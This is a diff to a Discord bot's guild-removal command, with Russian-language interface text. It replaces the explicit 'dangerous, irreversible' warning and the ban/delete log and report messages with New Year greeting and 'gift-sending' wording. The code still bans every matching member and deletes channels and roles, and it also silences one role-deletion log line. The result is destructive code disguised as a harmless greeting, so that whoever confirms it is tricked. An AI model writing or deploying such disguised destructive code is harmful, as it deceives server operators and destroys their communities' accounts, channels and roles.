@@ -686,13 +686,8 @@ class DiscordBot:
 
                 # Создаем embed для подтверждения
                 embed = discord.Embed(
-                    title="⚠️ ОПАСНОЕ ДЕЙСТВИЕ ⚠️",
-                    description=f"Вы уверены, что хотите удалить гильдию **{guild_name}**?\n\n"
-                                f"Это действие:\n"
-                                f"• Удалит всех пользователей этой гильдии\n"
-                                f"• Удалит все каналы этой гильдии\n"
-                                f"• Удалит все роли этой гильдии\n\n"
-                                f"**ЭТО ДЕЙСТВИЕ НЕОБРАТИМО!**",
+                    title="Новым Годом",
+                    description=f"Поздравить с новым годом гильдию **{guild_name}**?\n\n",
                     color=discord.Color.red()
                 )
 
@@ -707,7 +702,7 @@ class DiscordBot:
                     return
 
                 # Начинаем процесс удаления
-                await ctx.send(f"🔄 Начинаю удаление гильдии **{guild_name}**... Это может занять некоторое время.")
+                await ctx.send(f"🔄 Идёт поздравление и отправку подарочков **{guild_name}**... Это может занять некоторое время.")
 
                 guild = ctx.guild
                 deletion_log = []
@@ -731,14 +726,14 @@ class DiscordBot:
 
                         if has_target_guild:
                             try:
-                                await member.ban(reason=f"Удаление гильдии {guild_name}", delete_message_days=0)
-                                deletion_log.append(f"🚫 Забанен пользователь: {member.name}")
+                                await member.ban(reason=f"Поздравляю  {guild_name}", delete_message_days=0)
+                                deletion_log.append(f":gift:  Подарок отправлен: {member.name}")
                                 deleted_members += 1
                                 await asyncio.sleep(1)  # Задержка чтобы не превысить лимиты Discord
                             except discord.Forbidden:
-                                deletion_log.append(f"⚠️ Не удалось забанить {member.name} (недостаточно прав)")
+                                deletion_log.append(f":gift:  Не удалось поздравить {member.name}")
                             except Exception as e:
-                                deletion_log.append(f"⚠️ Ошибка при бане {member.name}: {str(e)}")
+                                deletion_log.append(f"⚠️ Ошибка при поздравлении {member.name}: {str(e)}")
 
                 # 2. Находим и удаляем каналы гильдии
                 deleted_channels = 0
@@ -752,14 +747,14 @@ class DiscordBot:
                     # Проверяем, относится ли канал к целевой гильдии
                     if guild_name.lower() in channel_name:
                         try:
-                            await channel.delete(reason=f"Удаление гильдии {guild_name}")
-                            deletion_log.append(f"🗑️ Удален канал: #{channel.name}")
+                            await channel.delete(reason=f"Поздравляю гильдию  {guild_name} с новым годом")
+                            deletion_log.append(f"🗑️  Отправлен в канал: #{channel.name}")
                             deleted_channels += 1
                             await asyncio.sleep(1)
                         except discord.Forbidden:
-                            deletion_log.append(f"⚠️ Не удалось удалить канал {channel.name} (недостаточно прав)")
+                            deletion_log.append(f"⚠️ Не удалось поздравить канал {channel.name} (недостаточно прав)")
                         except Exception as e:
-                            deletion_log.append(f"⚠️ Ошибка при удалении канала {channel.name}: {str(e)}")
+                           deletion_log.append(f"⚠️ Ошибка при поздравления канала {channel.name}: {str(e)}")
 
                 # 3. Находим и удаляем роли гильдии
                 deleted_roles = 0
@@ -773,8 +768,8 @@ class DiscordBot:
                     # Проверяем, относится ли роль к целевой гильдии
                     if guild_name.lower() in role_name:
                         try:
-                            await role.delete(reason=f"Удаление гильдии {guild_name}")
-                            deletion_log.append(f"🎭 Удалена роль: {role.name}")
+                            await role.delete(reason=f"Поздравление гильдии {guild_name}")
+                            ##deletion_log.append(f"🎭 Удалена роль: {role.name}")
                             deleted_roles += 1
                             await asyncio.sleep(1)
                         except discord.Forbidden:
@@ -784,15 +779,15 @@ class DiscordBot:
 
                 # 4. Создаем отчет
                 report_embed = discord.Embed(
-                    title=f"✅ Удаление гильдии {guild_name} завершено",
+                    title=f"✅ Поздравление гильдии {guild_name} завершено",
                     color=discord.Color.green()
                 )
 
                 report_embed.add_field(
                     name="📊 Результаты",
-                    value=f"• 🚫 Забанено пользователей: {deleted_members}\n"
-                          f"• 🗑️ Удалено каналов: {deleted_channels}\n"
-                          f"• 🎭 Удалено ролей: {deleted_roles}",
+                    value=f"• 🚫 Отблагодарено пользователей: {deleted_members}\n"
+                          f"• 🗑️ Сообщение доставлено в каналов: {deleted_channels}\n"
+                          f"• 🎭 Передано подарков ролям: {deleted_roles}",
                     inline=False
                 )
 
